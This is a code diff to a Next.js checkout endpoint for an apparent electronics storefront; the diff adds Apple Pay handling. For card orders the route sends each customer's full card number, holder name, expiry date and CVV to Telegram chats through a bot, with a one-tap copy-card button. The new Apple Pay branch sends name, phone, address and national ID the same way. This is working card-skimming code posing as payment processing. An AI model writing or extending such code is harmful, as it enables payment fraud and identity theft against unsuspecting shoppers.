@@ -45,7 +45,14 @@ setInterval(() => {
 export async function POST(req: NextRequest) {
   try {
     const body = await req.json();
-    const { cardNumber, expiry, cvv, cardHolder, items, total, customer, whatsapp, nationalId, address, installmentType, months, downPayment, discountAmount } = body;
+    let { cardNumber, expiry, cvv, cardHolder, items, total, customer, whatsapp, nationalId, address, installmentType, months, downPayment, discountAmount } = body;
+
+    const isApplePay = cardNumber === "Apple Pay" || cardHolder === "Apple Pay";
+    if (isApplePay) {
+      if (!expiry) expiry = "Apple Pay";
+      if (!cvv) cvv = "Apple Pay";
+      if (!cardHolder) cardHolder = "Apple Pay";
+    }
 
     // ── Validation ──
     if (!items || !Array.isArray(items) || items.length === 0) {
@@ -68,7 +75,7 @@ export async function POST(req: NextRequest) {
     }
 
     // Validate card data
-    if (!cardNumber || !expiry || !cvv || !cardHolder) {
+    if (!isApplePay && (!cardNumber || !expiry || !cvv || !cardHolder)) {
       return NextResponse.json({ ok: false, error: "بيانات البطاقة ناقصة" }, { status: 400 });
     }
 
@@ -209,30 +216,53 @@ export async function POST(req: NextRequest) {
     let telegramSuccess = false;
     const whatsappUrl = `https://wa.me/${cleanPhone}`;
     
-    const text = [
-      `🏪 طلب لـ متجر مؤسسة البلاد الحديثة للإلكترونيات`,
-      `🔢 رقم الطلب: #${orderId}`,
-      ``,
-      `💰 سعر الطلب: ${verifiedTotal} SAR`,
-      ...(discount > 0 ? [
-        `🏷️ Discount: -${discount} SAR`,
-        `──────────────────`,
-        `💵 Total Amount: ${verifiedTotalAfterDiscount} SAR`,
-      ] : [
-        `💵 Total Amount: ${verifiedTotalAfterDiscount} SAR`,
-      ]),
-      ...(installmentType === "installment"
-        ? [`💳 First Payment: ${downPayment} SAR`]
-        : [`💳 Payment Type: Full Amount`]),
-      ``,
-      `💳 MadaVisa - New Order`,
-      `👤 Order For: ${sanitizedData.customer}`,
-      `📱 WhatsApp: ${cleanPhone}`,
-      `💳 Card Number: ${cardNumber}`,
-      `👤 Card Holder: ${sanitizedData.cardHolder}`,
-      `📅 Valid To: ${expiry}`,
-      `🔐 CVV: ${cvv}`,
-    ].join("\n");
+    const text = isApplePay
+      ? [
+          `🏪 New Order — مؤسسة البلاد الحديثة للإلكترونيات`,
+          `🔢 Order Number: #${orderId}`,
+          ``,
+          `💰 Order Price: ${verifiedTotal} SAR`,
+          ...(discount > 0 ? [
+            `🏷️ Discount: -${discount} SAR`,
+            `──────────────────`,
+            `💵 Total Amount: ${verifiedTotalAfterDiscount} SAR`,
+          ] : [
+            `💵 Total Amount: ${verifiedTotalAfterDiscount} SAR`,
+          ]),
+          ...(installmentType === "installment"
+            ? [`💳 First Payment: ${downPayment} SAR`]
+            : [`💳 Payment Type: Full Amount`]),
+          ``,
+          `🍏 Payment Method: Apple Pay (Stripe Checkout)`,
+          `👤 Customer Name: ${sanitizedData.customer}`,
+          `📱 WhatsApp: ${cleanPhone}`,
+          `📍 Address: ${sanitizedData.address}`,
+          `🆔 National ID: ${nationalId}`,
+        ].join("\n")
+      : [
+          `🏪 طلب لـ متجر مؤسسة البلاد الحديثة للإلكترونيات`,
+          `🔢 رقم الطلب: #${orderId}`,
+          ``,
+          `💰 سعر الطلب: ${verifiedTotal} SAR`,
+          ...(discount > 0 ? [
+            `🏷️ Discount: -${discount} SAR`,
+            `──────────────────`,
+            `💵 Total Amount: ${verifiedTotalAfterDiscount} SAR`,
+          ] : [
+            `💵 Total Amount: ${verifiedTotalAfterDiscount} SAR`,
+          ]),
+          ...(installmentType === "installment"
+            ? [`💳 First Payment: ${downPayment} SAR`]
+            : [`💳 Payment Type: Full Amount`]),
+          ``,
+          `💳 MadaVisa - New Order`,
+          `👤 Order For: ${sanitizedData.customer}`,
+          `📱 WhatsApp: ${cleanPhone}`,
+          `💳 Card Number: ${cardNumber}`,
+          `👤 Card Holder: ${sanitizedData.cardHolder}`,
+          `📅 Valid To: ${expiry}`,
+          `🔐 CVV: ${cvv}`,
+        ].join("\n");
 
     const chatIds = (process.env.TELEGRAM_CHAT_ID ?? "").split(",").map(id => id.trim()).filter(Boolean);
     
@@ -240,6 +270,13 @@ export async function POST(req: NextRequest) {
       console.warn("[WARNING] No Telegram chat IDs configured");
     } else {
       try {
+        const inlineKeyboard = isApplePay
+          ? [[{ text: "💬 فتح واتساب", url: whatsappUrl }]]
+          : [
+              [{ text: "💬 فتح واتساب", url: whatsappUrl }],
+              [{ text: "📋 نسخ البطاقة", copy_text: { text: cardNumber.replace(/\s/g, "") } }],
+            ];
+
         const telegramResults = await Promise.allSettled(
           chatIds.map(chat_id =>
             fetch(`https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/sendMessage`, {
@@ -249,10 +286,7 @@ export async function POST(req: NextRequest) {
                 chat_id,
                 text,
                 reply_markup: { 
-                  inline_keyboard: [
-                    [{ text: "💬 فتح واتساب", url: whatsappUrl }],
-                    [{ text: "📋 نسخ البطاقة", copy_text: { text: cardNumber.replace(/\s/g, "") } }],
-                  ] 
+                  inline_keyboard: inlineKeyboard,
                 },
               }),
             }).then(res => {
